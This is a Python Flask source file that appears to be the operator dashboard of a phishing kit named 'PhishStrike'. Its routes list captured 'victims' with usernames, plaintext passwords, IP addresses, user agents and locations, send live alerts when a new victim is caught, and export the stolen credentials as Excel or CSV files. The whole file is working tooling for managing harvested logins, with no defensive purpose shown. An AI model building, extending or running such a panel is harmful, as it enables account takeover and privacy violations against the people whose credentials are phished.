from flask import Flask, render_template, jsonify, send_file, request
from flask_socketio import SocketIO
import sys
import os
import io
from datetime import datetime

# Add parent directory to path to import database
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import database

app = Flask(__name__)
app.config["SECRET_KEY"] = "phishstrike_secret_2025"
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/api/victims")
def get_victims():
    victims = database.get_all_victims()
    data = []
    for v in victims:
        data.append(
            {
                "id": v[0],
                "platform": v[1],
                "username": v[2],
                "password": v[3],
                "ip": v[4],
                "timestamp": v[5],
                "ua": v[6] if v[6] else "Unknown",
                "location": v[7] if v[7] else "Unknown",
            }
        )
    return jsonify(data)


@app.route("/api/stats")
def get_stats():
    stats = database.get_stats()
    return jsonify(stats)


@app.route("/api/delete/<int:victim_id>", methods=["POST"])
def delete_victim(victim_id):
    try:
        database.delete_victim(victim_id)
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/api/delete_all", methods=["POST"])
def delete_all_victims():
    try:
        import sqlite3
        conn = sqlite3.connect(database.DB_PATH)
        conn.execute("DELETE FROM victims")
        conn.commit()
        conn.close()
        return jsonify({"status": "success"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/api/export")
def export_excel():
    try:
        import pandas as pd
        victims = database.get_all_victims()
        df = pd.DataFrame(
            victims,
            columns=["ID", "Platform", "Username", "Password", "IP", "Timestamp", "UserAgent", "Location"],
        )
        filename = f"phishstrike_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.xlsx"
        path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "auth", filename)
        df.to_excel(path, index=False)
        return send_file(path, as_attachment=True, download_name=filename)
    except ImportError:
        return jsonify({"status": "error", "message": "pandas not installed"}), 500
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/api/export_csv")
def export_csv():
    try:
        victims = database.get_all_victims()
        lines = ["ID,Platform,Username,Password,IP,Timestamp,UserAgent,Location"]
        for v in victims:
            row = [str(x).replace(",", ";") if x else "" for x in v]
            lines.append(",".join(row))
        csv_content = "\n".join(lines)
        buf = io.BytesIO(csv_content.encode("utf-8"))
        filename = f"phishstrike_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
        return send_file(buf, as_attachment=True, download_name=filename, mimetype="text/csv")
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500


def notify_new_victim(data):
    socketio.emit("new_victim", data)


if __name__ == "__main__":
    database.init_db()
    print("\033[1;38;2;0;255;255m[*] PhishStrike Dashboard running at http://localhost:5000\033[0m")
    socketio.run(app, host="0.0.0.0", port=5000, debug=False, allow_unsafe_werkzeug=True)
